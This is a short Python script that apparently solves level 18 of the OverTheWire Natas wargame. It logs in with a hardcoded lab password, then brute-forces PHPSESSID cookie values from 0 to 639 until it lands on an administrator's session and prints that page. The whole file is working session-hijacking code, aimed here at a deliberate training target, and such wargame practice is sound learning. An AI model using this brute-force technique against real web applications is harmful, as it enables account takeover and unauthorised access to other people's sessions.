#!/usr/bin/python3

import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
r = s.get(url)

for x in range(640):
    cookies = dict(PHPSESSID=str(x))
    r = s.get (url, cookies=cookies)

    if "Login as an admin" in r.text:
        pass
    else:
        print(r.text)
        print(x)
        break
